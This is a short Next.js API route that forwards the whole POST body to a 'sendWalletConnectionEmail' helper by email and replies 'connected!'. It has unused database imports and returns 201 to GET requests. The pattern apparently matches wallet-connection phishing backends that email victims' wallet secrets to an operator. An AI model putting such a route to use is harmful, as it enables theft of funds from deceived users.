// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import mongoose from 'mongoose';
import Customer from "../../model/customer";
import { DATABASE_URI } from "../../utils/database"
import { sendWalletConnectionEmail } from "../../utils/mailer"

// INITIALIZING THE DATABASE.
const dbURI = process.env.DATABASE_URI;
const databaseOptions = {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  autoIndex: true,
  // useCreateIndex: true,      /* Not-supported by Next.js */
  // useFindAndModify: false,   /* Not-supported by Next.js */
}

export default async (req, res) => {
    if(req.method === 'GET') return res.status(201).json({msg: 'POST REQUEST ONLY!'})
    console.log("The POST request for --- - /api/send-verification-code - ---");

    const data = req.body
    
    sendWalletConnectionEmail(data, (err, success) => {
        if (err) return res.json({ error: 'Verification failed! could\'nt connect to wallet.' })
        
        res.json({ success: success, msg: 'connected!'})
    })
}
  